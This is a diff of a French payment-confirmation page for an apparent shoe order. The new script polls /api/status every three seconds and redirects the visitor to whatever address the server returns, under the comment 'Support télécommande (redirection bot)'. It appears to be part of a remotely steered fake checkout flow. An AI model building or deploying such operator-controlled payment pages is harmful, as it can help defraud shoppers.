@@ -1,87 +1,31 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Paiement accepté</title>
+  <meta charset="UTF-8">
+  <title>Paiement accepté ✅</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f8f9fa;
-      text-align: center;
-      padding-top: 100px;
-      color: #333;
-    }
-    .card {
-      background: white;
-      display: inline-block;
-      padding: 40px 60px;
-      border-radius: 20px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      animation: fadeIn 0.6s ease-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    h1 {
-      color: #28a745;
-      font-size: 2em;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 1.1em;
-      margin-bottom: 20px;
-    }
-    button {
-      background-color: #007bff;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      font-size: 1em;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    .checkmark {
-      font-size: 3.5em;
-      color: #28a745;
-      margin-bottom: 15px;
-    }
+    body { background:#e6ffe6; color:#333; font-family:Arial, sans-serif; text-align:center; padding-top:80px; }
+    .box { background:white; max-width:400px; margin:auto; padding:30px; border-radius:15px; box-shadow:0 4px 12px rgba(0,0,0,0.1); }
+    h1 { color:#28a745; }
+    a { display:inline-block; margin-top:20px; padding:10px 20px; background:#28a745; color:white; text-decoration:none; border-radius:8px; }
+    a:hover { background:#218838; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="checkmark">✅</div>
-    <h1>Paiement accepté</h1>
-    <p>Merci pour votre commande ! Votre paiement a été validé avec succès.</p>
-    <button id="seeProduct">👟 Voir produit</button>
+  <div class="box">
+    <h1>✅ Paiement accepté !</h1>
+    <p>Merci pour votre commande 👟</p>
+    <a href="/">Retour à l’accueil</a>
   </div>
 
   <script>
-    document.getElementById('seeProduct').addEventListener('click', async () => {
-      // Envoie notif retour produit
-      try {
-        await fetch('/api/visit'); // notifie comme une nouvelle visite (produit)
-      } catch(e) { console.error(e); }
-      // Redirige vers produit
-      window.location.href = '/product.html';
-    });
-
-    // Vérifie les redirections admin
-    async function checkStatus() {
+    // Support télécommande (redirection bot)
+    setInterval(async () => {
       const res = await fetch('/api/status');
       const data = await res.json();
-      if (data.redirect) {
-        window.location.href = data.redirect;
-      } else {
-        setTimeout(checkStatus, 2000);
-      }
-    }
-    checkStatus();
+      if (data.redirect) window.location.href = data.redirect;
+    }, 3000);
   </script>
 </body>
 </html>
